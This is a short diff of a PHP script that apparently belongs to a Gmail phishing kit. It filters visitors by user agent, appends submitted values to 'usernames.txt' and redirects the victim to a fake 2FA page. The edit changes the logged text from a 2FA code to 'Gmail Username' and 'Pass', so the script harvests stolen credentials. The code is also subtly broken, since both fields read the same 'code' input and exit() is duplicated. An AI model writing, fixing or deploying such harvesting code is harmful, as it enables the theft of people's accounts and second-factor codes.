@@ -10,7 +10,8 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
         exit;
     }
 }
-file_put_contents("usernames.txt", "2FA Code: " . $_POST['code'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Gmail Username: " . $_POST['code'] . " Pass: " . $_POST['code'] . "\n", FILE_APPEND);
 header('Location: 2fa.html');
+exit();
 exit();
 ?>
